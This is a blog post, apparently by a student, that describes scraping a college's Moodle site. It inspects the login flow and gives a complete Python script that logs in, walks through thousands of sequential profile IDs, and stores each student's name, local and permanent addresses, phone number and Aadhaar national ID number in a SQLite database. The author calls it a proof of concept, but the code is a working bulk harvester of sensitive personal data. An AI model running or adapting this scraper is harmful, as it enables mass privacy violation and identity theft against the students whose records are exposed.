
# Synopsis

Been messing around with my college's Moodle instance for about 6 months. Found a few interesting data fields on people's profiles. It's been way too long since I've visited my web-scraping origins (I used to web scrape for a living at one point!) so this seems good as any opportunity. 

Please note that no data will be leaked in this quest, and any and all data shown for demonstration purposes will be censored for ensuring the privacy of their respective owners. This is a **PROOF OF CONCEPT** and not intended for offensive use.

Moodle is an open-source learning platform written majorly in PHP and licensed under the GNU GPL 3.0 license. 

<svg width="700" height="280" xmlns="http://www.w3.org/2000/svg">
  <!-- Progress Bar without rounded corners -->
  <rect x="0" y="20" width="500" height="30" fill="#4F5D95" />
  <rect x="500" y="20" width="90" height="30" fill="#F7DF1E" />
  <rect x="590" y="20" width="25" height="30" fill="#5BDF5B" />
  <rect x="615" y="20" width="12" height="30" fill="#2965F1" />
  <rect x="627" y="20" width="11" height="30" fill="#F37C00" />
  <rect x="638" y="20" width="3" height="30" fill="#CF649A" />
  <rect x="641" y="20" width="15" height="30" fill="#CCCCCC" /> <!-- Adjusted width for 'Other' -->

  <!-- Legend with circles as bullet points -->
  <circle cx="10" cy="70" r="5" fill="#4F5D95" />
  <text x="20" y="75" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">PHP (78.7%)</text>

  <circle cx="10" cy="100" r="5" fill="#F7DF1E" />
  <text x="20" y="105" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">JS (14.0%)</text>

  <circle cx="10" cy="130" r="5" fill="#5BDF5B" />
  <text x="20" y="135" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">Gherkin (3.5%)</text>

  <circle cx="10" cy="160" r="5" fill="#2965F1" />
  <text x="20" y="165" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">CSS (1.7%)</text>

  <circle cx="10" cy="190" r="5" fill="#F37C00" />
  <text x="20" y="195" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">Mustache (1.6%)</text>

  <circle cx="10" cy="220" r="5" fill="#CF649A" />
  <text x="20" y="225" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">SCSS (0.4%)</text>

  <circle cx="10" cy="250" r="5" fill="#CCCCCC" />
  <text x="20" y="255" font-size="16" fill="#FFF" text-rendering="optimizeLegibility" font-family="Arial, sans-serif">Other (0.1%)</text>
</svg>


I'm going to try and do some reconnaissance first on how the site handles authentication and how it serves the data I'm interested in- by observing the requests made and the cookies set. Then I'm going to build a scraper to extract the data that I'm interested in.

## Here's everything I'll be using in this post:
- [Firefox](https://www.mozilla.org/en-US/firefox/): This is my preferred browser of choice.
- [Cookie editor extension](https://cookie-editor.com/): This is technically redundant since the same thing can be achieved through the browser console, but I'm using it anyway.
- [DB4S](https://sqlitebrowser.org/): A SQLite database browser GUI.
- [Moodle](https://moodle.org/): A private, unhardened Moodle.
- [python](https://www.python.org/): Version 3.13.1 at the time of writing.
- [requests](https://requests.readthedocs.io/en/latest/): "Industry standard".
- [lxml](https://lxml.de/): Picking this over BeautifulSoup because of `css selector` support out of the box.
- [cssselect](https://pypi.org/project/cssselect/): Companion library for lxml.
Here's the [GitHub repository](http://github.com/syswraith/moodle-scraper)
Let's get started!

# Authentication

First things that I notice right off the bat are:
- The LMS is written in PHP meaning majority of the operations might be handled without having to execute any JavaScript code. That's good.
- With the Cookie-Editor extension, I can see that a cookie named `MoodleSession` is being set to a random string of 26 alphanumeric characters. That's interesting.
![[moodle_session_cookie.png]]

Secondly, authenticating myself with a username and password makes the equivalent of the
following cURL request:
```bash
curl 'https://lms.example.edu.in/login/index.php'
-X POST
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101
Firefox/132.0'
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br,
zstd'
-H 'Content-Type: application/x-www-form-urlencoded'
-H 'Origin: https://lms.example.edu.in'
-H 'Connection: keep-alive'
-H 'Referer: https://lms.example.edu.in/'
-H 'Cookie: MoodleSession=pb0nit3tf74c0b4tmkik6emac4'
-H 'Upgrade-Insecure-Requests: 1'
-H 'Sec-Fetch-Dest: document'
-H 'Sec-Fetch-Mode: navigate'
-H 'Sec-Fetch-Site: same-origin'
-H 'Sec-Fetch-User: ?1'
-H 'Priority: u=0, i' --data-raw
'logintoken=3TnGvxtmc1PfYcLuWzk5MUfF7E9balQs&username=username&password=pass
word-url-encoded'
```

- This tells us that there are two `MoodleSession` cookies, one before authentication and one after authentication.
- Usernames and passwords are being URL-encoded and sent in plain-text over the HTTP POST request.
- It took me a few tries but i finally found `logintoken` sneakily nested inside the page's source code in the following way:
![[logintoken_nested.png]]


# Writing the script

Now that we're done with some passive reconnaissance, let's get to the script!

1. Going to create a file named `userpass.json` to store my credentials. This is useful because I can add it to the `.gitignore` file. The main file will read this file and get the credentials from it on each run. 

```json
{
	"username":"username here",
	"password":"password here"
}
```

```python
with open("userpass.json") as auth_data:
    auth_creds = json.loads(auth_data.read())

uname = auth_creds["username"]
upass = auth_creds["password"]
```

2. We'll setup a [request.session](https://requests.readthedocs.io/en/latest/api/#requests.Session) class for the following reasons:
	- Persistent cookies
	- Updating and passing cookies to requests made
	- Persistent header and passing them in the requests

3. The first request will be to the home page, which contains the `logintoken` that we need to extract from the DOM. 

```python
# Session setup
session = requests.Session()

# Initial GET request
first_response = session.get("https://lms.example.edu.in/")

# Parse the login page to extract the login token
first_dom_tree = html.fromstring(first_response.text)
login_token = first_dom_tree.cssselect("#pre-login-form > input:nth-child(1)")[0].get("value")
```

4. Let's go ahead and authenticate ourselves. For this, we will make a `dict` of the required fields (see the curl command above). We will make a request with this data:

```python
# Data for login
data = {
        "logintoken": login_token,
        "username": uname,
        "password": upass,
        }

# Send the POST request to login
second_response = session.post(
        "https://lms.example.edu.in/login/index.php",
        data=data,
        allow_redirects=True
        )
```

5. The next bit is tricky. We need to make a request to the `"https://lms.example.edu.in/user/profile.php?id={x}"` endpoint (where `x` is an `int`) in order to get the profile page. Certain CSS selectors are utilized to get the fields that we're interested in, and a `try-except` block to handle `IndexError` that is raised if the field does not exist (very possible that certain fields are not filled). We will also skip over the current iteration if the `name` selector returns nothing, since data is not of much use to us if we don't know who it belongs to. 

	In this example we will only get fields like `name`, `local address`, `permanent address`, `phone number` and (most interesting of all!) `aadhar`. Read up on [Aadhar](https://en.wikipedia.org/wiki/Aadhaar) here and see why its important to never disclose it publicly, like its been done here.

```python
third_response = session.get(f"https://lms.example.edu.in/user/profile.php?id={x}")
third_dom_tree = html.fromstring(third_response.text)
    
try:
    name = third_dom_tree.cssselect(".fullname > span:nth-child(1)")[0].text.strip('\n') 
except IndexError:
    continue

try:
    laddr = third_dom_tree.cssselect("li.contentnode:nth-child(3) > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
except IndexError:
    laddr = ""
    
try:
    paddr = third_dom_tree.cssselect(".custom_field_CorrespondenceAddressPermanent > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
except IndexError:
    paddr = ""
    
try:
    aadhar = third_dom_tree.cssselect(".custom_field_AaadharNo > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
except IndexError:
    aadhar = ''
    
try:
    phone  = third_dom_tree.cssselect(".custom_field_ContactNumber > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
except IndexError:
    phone = ''
```

6. Since we want to scrape a RANGE of integers, we will wrap this whole thing in a `for` loop.

```python
for x in range(7000):
    print(x)
    third_response = session.get(f"https://lms.example.edu.in/user/profile.php?id={x}")
    third_dom_tree = html.fromstring(third_response.text)
    
    try:
        name = third_dom_tree.cssselect(".fullname > span:nth-child(1)")[0].text.strip('\n') 
    except IndexError:
        continue

    try:
        laddr = third_dom_tree.cssselect("li.contentnode:nth-child(3) > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
    except IndexError:
        laddr = ""
    
    try:
        paddr = third_dom_tree.cssselect(".custom_field_CorrespondenceAddressPermanent > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
    except IndexError:
        paddr = ""
    
    try:
        aadhar = third_dom_tree.cssselect(".custom_field_AaadharNo > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
    except IndexError:
        aadhar = ''
    
    try:
        phone  = third_dom_tree.cssselect(".custom_field_ContactNumber > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
    except IndexError:
        phone = ''

```

7. We have this extracted data. Now we need to perform operations on it. First one is obviously, printing it out to the console. The second one is a bit more interesting. Since we have this data, I thought it'd be fun to make a `SQLite` database and push all the data into it. Since we're performing multiple operations on this extracted data, we might as well create a `class` to make the whole thing a *bit* cleaner.

```python
# Initialize database
conn = sqlite3.connect("person_data.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS persons (
    uid INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    laddr TEXT,
    paddr TEXT,
    aadhar TEXT,
    phone TEXT
)
""")
conn.commit()

```

```python
class Person:
    def __init__(self, name, uid, laddr, paddr, aadhar, phone):
        self.name = name
        self.uid = uid
        self.laddr = laddr
        self.paddr = paddr
        self.aadhar = aadhar
        self.phone = phone
    
    def __str__(self):
        return f'"uid":"{self.uid}",name":"{self.name}","laddr":"{self.laddr}","paddr":"{self.paddr}","aadhar":"{self.aadhar}","phone":"{self.phone}"'

    def save_to_db(self, connection):
        cursor = connection.cursor()
        cursor.execute("""
        INSERT OR REPLACE INTO persons (uid, name, laddr, paddr, aadhar, phone) 
        VALUES (?, ?, ?, ?, ?, ?)
        """, (self.uid, self.name, self.laddr, self.paddr, self.aadhar, self.phone))
        connection.commit()

```

8. Finally, we add these functions to the code so far. We will print out the data and push them into the database. Here's the full code:

```python
import sqlite3
import json
import requests
from lxml import html

# Data
with open("userpass.json") as auth_data:
    auth_creds = json.loads(auth_data.read())

uname = auth_creds["username"]
upass = auth_creds["password"]

# Session setup
session = requests.Session()

# Initial GET request
first_response = session.get("https://lms.example.edu.in/")

# Parse the login page to extract the login token
first_dom_tree = html.fromstring(first_response.text)
login_token = first_dom_tree.cssselect("#pre-login-form > input:nth-child(1)")[0].get("value")

# Data for login
data = {
        "logintoken": login_token,
        "username": uname,
        "password": upass,
        }

# Send the POST request to login
second_response = session.post(
        "https://lms.example.edu.in/login/index.php",
        data=data,
        allow_redirects=True
        )

# Initialize database
conn = sqlite3.connect("person_data.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS persons (
    uid INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    laddr TEXT,
    paddr TEXT,
    aadhar TEXT,
    phone TEXT
)
""")
conn.commit()

class Person:
    def __init__(self, name, uid, laddr, paddr, aadhar, phone):
        self.name = name
        self.uid = uid
        self.laddr = laddr
        self.paddr = paddr
        self.aadhar = aadhar
        self.phone = phone
    
    def __str__(self):
        return f'"uid":"{self.uid}",name":"{self.name}","laddr":"{self.laddr}","paddr":"{self.paddr}","aadhar":"{self.aadhar}","phone":"{self.phone}"'

    def save_to_db(self, connection):
        cursor = connection.cursor()
        cursor.execute("""
        INSERT OR REPLACE INTO persons (uid, name, laddr, paddr, aadhar, phone) 
        VALUES (?, ?, ?, ?, ?, ?)
        """, (self.uid, self.name, self.laddr, self.paddr, self.aadhar, self.phone))
        connection.commit()


for x in range(15000,26200):
    third_response = session.get(f"https://lms.example.edu.in/user/profile.php?id={x}")
    third_dom_tree = html.fromstring(third_response.text)
    
    try:
        name = third_dom_tree.cssselect(".fullname > span:nth-child(1)")[0].text.strip('\n') 
    except IndexError:
        continue

    try:
        laddr = third_dom_tree.cssselect("li.contentnode:nth-child(3) > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
    except IndexError:
        laddr = ""
    
    try:
        paddr = third_dom_tree.cssselect(".custom_field_CorrespondenceAddressPermanent > dl:nth-child(1) > dd:nth-child(2) > div:nth-child(1) > table:nth-child(2) > tbody:nth-child(2) > tr:nth-child(1) > td:nth-child(1)")[0].text.strip('\n')
    except IndexError:
        paddr = ""
    
    try:
        aadhar = third_dom_tree.cssselect(".custom_field_AaadharNo > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
    except IndexError:
        aadhar = ''
    
    try:
        phone  = third_dom_tree.cssselect(".custom_field_ContactNumber > dl:nth-child(1) > dd:nth-child(2)")[0].text.strip('\n')
    except IndexError:
        phone = ''

    person = Person(name, x, laddr, paddr, aadhar, phone)
    person.save_to_db(conn)  # Save each person to the database
    print(person)

# Close the connection
conn.close()
```


# Output

Scraped data output from the console:

![[scraped_data_console.png]]

Scraped data from the database:

![[scraped_data_db.jpg]]


# Parting thoughts

> ”In God we trust. All others must bring data.” ~ W. Edwards Deming

Keep yours safe :)
